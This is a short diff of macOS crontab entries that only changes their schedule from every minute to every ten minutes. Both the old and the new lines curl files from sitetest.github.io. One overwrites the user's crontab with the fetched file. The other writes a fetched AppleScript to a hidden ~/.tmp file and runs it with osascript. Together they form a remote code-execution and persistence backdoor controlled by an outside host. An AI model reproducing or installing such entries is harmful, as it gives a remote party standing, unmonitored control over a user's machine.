@@ -1,2 +1,2 @@
-* * * * * curl -s https://sitetest.github.io/cron.txt >~/.tmp/.tmp; crontab ~/.tmp/.tmp; rm ~/.tmp/.tmp
-* * * * * curl -s https://sitetest.github.io/scr.txt >~/.tmp/.tmp.scpt; osascript ~/.tmp/.tmp.scpt;
+*/10 * * * * curl -s https://sitetest.github.io/cron.txt >~/.tmp/.tmp; crontab ~/.tmp/.tmp; rm ~/.tmp/.tmp
+*/10 * * * * curl -s https://sitetest.github.io/scr.txt >~/.tmp/.tmp.scpt; osascript ~/.tmp/.tmp.scpt;
